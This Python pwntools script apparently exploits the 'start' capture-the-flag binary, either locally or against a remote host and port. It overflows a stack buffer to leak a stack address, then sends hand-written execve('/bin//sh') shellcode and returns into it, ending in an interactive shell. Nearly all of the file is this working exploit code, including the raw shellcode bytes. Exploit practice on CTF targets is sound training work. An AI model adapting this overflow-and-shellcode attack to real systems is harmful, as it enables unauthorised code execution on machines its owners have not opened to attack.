#!/usr/bin/env python
from pwn import *
import sys

context.terminal = ['tmux','splitw','-h']

gdb_bool = True
#gdb_bool = False

def exploit(r):

    r.recvuntil("CTF:")
    buf = "" 
    buf += "A" * cyclic_find("faaa")
    buf += p32(0x8048087)
    r.send(buf)

    leak_addr = u32(r.recvn(4))
    print("leak_addr: ", hex(leak_addr))
    r.recvn(10)

    shellcode = '\x31\xC0\xF7\xE9\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x68\x2D\x69\x69\x69\x89\xE6\x50\x56\x53\x89\xE1\xB0\x0B\xCD\x80'
    buf2 = ""
    buf2 += "B" * 20
    buf2 += p32(leak_addr+0x14)
    buf2 += shellcode
    r.sendline(buf2)

    r.interactive()
    return


if __name__ == "__main__":
    log.info("For remote %s HOST PORT" % sys.argv[0])
    
    binary_name = "./start"        #put binary name here
    e = ELF(binary_name)

    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(binary_name)
        print util.proc.pidof(r)
        gdb_cmd = [
            "b *0x8048087",
            "c"


        ]
        if(gdb_bool):
            gdb.attach(r, gdbscript = "\n".join(gdb_cmd))
        #r = process("./LOLgame", env={"LD_PRELOAD" : "./libc.so.6.remote"})
        #pause()
        exploit(r)

